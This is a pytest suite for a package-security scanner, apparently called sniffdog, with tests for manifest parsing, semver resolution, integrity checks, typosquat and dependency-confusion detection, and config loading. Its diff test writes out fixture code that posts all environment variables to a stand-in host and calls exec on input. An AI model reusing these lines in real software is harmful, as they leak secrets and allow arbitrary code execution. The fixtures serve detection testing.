import base64
import hashlib
import json

import pytest

from sniffdog import audit as audit_mod
from sniffdog.audit import audit, discover, parse_manifest
from sniffdog.config import Config, load_config
from sniffdog.diff import diff_results
from sniffdog.registry import RegistryError, _verify, parse_spec, resolve_npm_version
from sniffdog.scanner import Scanner


def test_parse_spec_variants():
    assert parse_spec("requests==2.32.3").__dict__ == {"ecosystem": "pypi", "name": "requests", "version": "2.32.3"}
    assert parse_spec("npm:lodash@4.17.21").version == "4.17.21"
    s = parse_spec("@babel/core@7.0.0")
    assert (s.ecosystem, s.name, s.version) == ("npm", "@babel/core", "7.0.0")
    assert parse_spec("pypi:Django[argon2]").name == "Django"
    with pytest.raises(RegistryError):
        parse_spec("pypi:!!!")


def test_npm_semver_resolution():
    pk = {
        "name": "x",
        "dist-tags": {"latest": "2.1.0", "next": "3.0.0-rc.1"},
        "versions": {v: {} for v in ["1.0.0", "1.2.3", "1.9.9", "2.0.0", "2.1.0", "3.0.0-rc.1"]},
    }
    assert resolve_npm_version(pk, None) == "2.1.0"
    assert resolve_npm_version(pk, "^1.2.0") == "1.9.9"
    assert resolve_npm_version(pk, "~1.2.0") == "1.2.3"
    assert resolve_npm_version(pk, "1.x") == "1.9.9"
    assert resolve_npm_version(pk, ">=2") == "2.1.0"
    assert resolve_npm_version(pk, "next") == "3.0.0-rc.1"


def test_integrity_verification():
    data = b"artifact"
    _verify(data, "u", hashlib.sha256(data).hexdigest(), None, None)
    sri = "sha512-" + base64.b64encode(hashlib.sha512(data).digest()).decode()
    _verify(data, "u", None, sri, None)
    with pytest.raises(RegistryError):
        _verify(b"tampered", "u", None, sri, None)


def test_manifest_parsers(tmp_path):
    (tmp_path / "requirements.txt").write_text(
        "requests==2.32.3\n# c\nreqeusts>=1\n-r more.txt\n-e .\nflask[async]==3.0.0 ; python_version>'3.8'\n"
    )
    (tmp_path / "more.txt").write_text("colourama==0.1\n")
    names = {(d.name, d.version) for d in parse_manifest(tmp_path / "requirements.txt")}
    assert names == {("requests", "2.32.3"), ("reqeusts", None), ("colourama", "0.1"), ("flask", "3.0.0")}
    (tmp_path / "package-lock.json").write_text(
        json.dumps(
            {
                "lockfileVersion": 3,
                "packages": {
                    "": {"name": "app"},
                    "node_modules/lodash": {"version": "4.17.21"},
                    "node_modules/a/node_modules/lodahs": {"version": "1.0.0"},
                },
            }
        )
    )
    deps = {(d.name, d.version, d.direct) for d in parse_manifest(tmp_path / "package-lock.json")}
    assert ("lodahs", "1.0.0", False) in deps and ("lodash", "4.17.21", True) in deps
    (tmp_path / "yarn.lock").write_text(
        '"@babel/core@^7.0.0", "@babel/core@^7.1.0":\n  version "7.24.0"\n\nlodash@^4:\n  version "4.17.21"\n'
    )
    assert {d.name for d in parse_manifest(tmp_path / "yarn.lock")} == {"@babel/core", "lodash"}
    (tmp_path / "pyproject.toml").write_text(
        '[project]\nname="a"\ndependencies=["httpx==0.27.0", "pydantic>=2"]\n[tool.poetry.dependencies]\npython="^3.11"\nrich="13.7.1"\n'
    )
    assert {d.name for d in parse_manifest(tmp_path / "pyproject.toml")} == {"httpx", "pydantic", "rich"}
    (tmp_path / "poetry.lock").write_text('[[package]]\nname = "idna"\nversion = "3.7"\n')
    assert discover(tmp_path)[0].name in ("poetry.lock", "package-lock.json")


def test_audit_typosquat_and_dependency_confusion(tmp_path, monkeypatch):
    (tmp_path / "requirements.txt").write_text("reqeusts==1.0\nacme-billing==1.0\nrequests==2.32.3\n")
    monkeypatch.setattr(audit_mod, "pypi_exists", lambda name: name == "acme-billing")
    res = {r.package.name: r for r in audit([tmp_path / "requirements.txt"], Config(internal_prefixes=["acme-"]))}
    assert res["reqeusts"].findings[0].rule_id == "TYPOSQUAT"
    assert res["acme-billing"].findings[0].rule_id == "DEP-CONFUSION" and res["acme-billing"].verdict == "malicious"
    assert res["requests"].verdict == "clean"


def test_diff_reports_only_new_behaviour(tmp_path):
    old, new = tmp_path / "x-1.0", tmp_path / "x-1.1"
    for d in (old, new):
        (d / "x").mkdir(parents=True)
        (d / "x" / "__init__.py").write_text("import subprocess\nexec(input())\n")
        (d / "setup.py").write_text("from setuptools import setup\nsetup(name='x')\n")
    (new / "x" / "telemetry.py").write_text("import os, requests\nrequests.post('https://t.invalid', json=dict(os.environ))\n")
    s = Scanner(Config(metadata=False))
    d = diff_results(s.scan_path(old), s.scan_path(new), {"a"}, {"a", "x/telemetry.py"})
    assert [f.rule_id for f in d.added] == ["PY-EXFIL"] and not d.removed and d.files_added == ["x/telemetry.py"]


def test_config_loading(tmp_path):
    (tmp_path / "pyproject.toml").write_text(
        '[tool.sniffdog]\nfail_on = "critical"\nignore_rules = ["META-*"]\ninternal-prefixes = ["acme-"]\n'
    )
    c = load_config(start=tmp_path)
    assert c.fail_on.name == "CRITICAL" and c.internal_prefixes == ["acme-"]
    (tmp_path / "bad.toml").write_text("nope = 1\n")
    with pytest.raises(ValueError):
        load_config(str(tmp_path / "bad.toml"))
